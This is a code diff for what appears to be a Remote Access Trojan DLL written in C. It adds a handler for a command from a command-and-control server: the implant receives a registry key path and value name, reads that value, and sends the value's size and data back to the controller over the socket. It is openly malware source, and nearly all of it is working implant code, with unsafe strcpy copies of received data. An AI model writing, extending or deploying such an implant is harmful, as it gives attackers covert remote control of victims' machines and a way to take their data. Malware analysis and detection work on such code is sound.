@@ -372,6 +372,8 @@ INT startListen()
             // C2 says to read a registry key 
             else if (strcmp((const char*)&recvBuf, REGREAD) == 0)
             {
+                OutputDebugStringA("RAT-Dll-Connect::startListen - Performing registry read...\n");
+
                 // Receive our key path 
                 status = recv(clientSock, recvBuf, recvBufLen, 0);
                 if (status == SOCKET_ERROR)
@@ -385,6 +387,9 @@ INT startListen()
                 CHAR keyPathBuffer[DEFAULT_BUF_LEN];
                 strcpy(keyPathBuffer, recvBuf);
 
+                sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Received key path: %s\n", keyPathBuffer);
+                OutputDebugStringA(msgBuf);
+
                 // Get the value name
                 status = recv(clientSock, recvBuf, recvBufLen, 0);
                 if (status == SOCKET_ERROR)
@@ -397,19 +402,15 @@ INT startListen()
                 CHAR valueBuffer[DEFAULT_BUF_LEN];
                 strcpy(valueBuffer, recvBuf);
 
+                sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Received key value: %s\n", valueBuffer);
+                OutputDebugStringA(msgBuf);
+
                 sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Performing reg read on path %s with key %s...\n", keyPathBuffer, valueBuffer);
                 OutputDebugStringA(msgBuf);
 
                 void* regValue = NULL;
-                /**regValue = (void**)malloc(sizeof(void*));
-                if (regValue == NULL)
-                {
-                    OutputDebugStringA("RAT-Dll::startListen - Failed to allocate space for regValue buffer! \n");
-                    status = FAILURE;
-                    goto cleanup;
-                }*/
 
-                DWORD sizeRegValue = 0;
+                DWORD sizeRegValue = NULL;
 
                 status = performRegRead(keyPathBuffer, valueBuffer, &regValue, &sizeRegValue);
                 if (status != SUCCESS)
@@ -419,8 +420,33 @@ INT startListen()
                     goto cleanup;
                 }
 
-                // send back success
+                status = sendSuccess(clientSock);
+                if (status != SUCCESS)
+                {
+                    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure recevied from sendSuccess %d\n", status);
+                    OutputDebugStringA(msgBuf);
+                    goto cleanup;
+                }
 
+                // Send back the size of the key value we read 
+                status = send(clientSock, (const char*)&sizeRegValue, sizeof(sizeRegValue), 0);
+                if (status == SOCKET_ERROR)
+                {
+                    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure recevied from send (sizeRegValue) %d\n", WSAGetLastError());
+                    OutputDebugStringA(msgBuf);
+                    continue;
+                }
+
+                // Send back key data we got
+                status = send(clientSock, (const char*)regValue, sizeRegValue, 0);
+                if (status == SOCKET_ERROR)
+                {
+                    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure recevied from send (regValue) %d\n", WSAGetLastError());
+                    OutputDebugStringA(msgBuf);
+                    continue;
+                }
+
+                OutputDebugStringA("RAT-Dll-Connect::startListen - Successfully performed registry read!\n");
             }
         }
 
